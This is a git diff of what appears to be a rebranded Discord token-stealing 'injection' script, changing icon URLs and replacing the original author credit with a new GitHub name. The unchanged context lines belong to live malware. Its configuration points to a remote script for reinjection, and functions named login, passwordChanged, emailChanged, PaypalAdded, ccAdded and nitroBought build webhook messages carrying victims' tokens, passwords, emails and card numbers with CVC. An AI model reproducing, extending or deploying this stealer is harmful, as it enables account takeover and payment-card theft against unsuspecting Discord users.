@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Mars Injection', //name of the webhook thats gonna send the info
-  embed_icon: '', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://cdn.pfps.gg/pfps/3897-sailor-mars-30.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/ohioguy123/boobs-dick/main/injector/tits.js', //injection url for when it reinjects
   /**
@@ -677,10 +677,10 @@ const login = async (email, password, token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.pfps.gg/pfps/3897-sailor-mars-30.png`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By github.com/ohioguy123',
         },
       },
     ],
@@ -719,10 +719,10 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.pfps.gg/pfps/3897-sailor-mars-30.png`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By github.com/ohioguy123',
         },
       },
     ],
@@ -761,10 +761,10 @@ const emailChanged = async (email, password, token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.pfps.gg/pfps/3897-sailor-mars-30.png`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By github.com/ohioguy123',
         },
       },
     ],
@@ -803,10 +803,10 @@ const PaypalAdded = async (token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.pfps.gg/pfps/3897-sailor-mars-30.png`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By github.com/ohioguy123',
         },
       },
     ],
@@ -845,10 +845,10 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.pfps.gg/pfps/3897-sailor-mars-30.png`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By github.com/ohioguy123',
         },
       },
     ],
@@ -889,10 +889,10 @@ const nitroBought = async (token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.pfps.gg/pfps/3897-sailor-mars-30.png`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By github.com/ohioguy123',
         },
       },
     ],
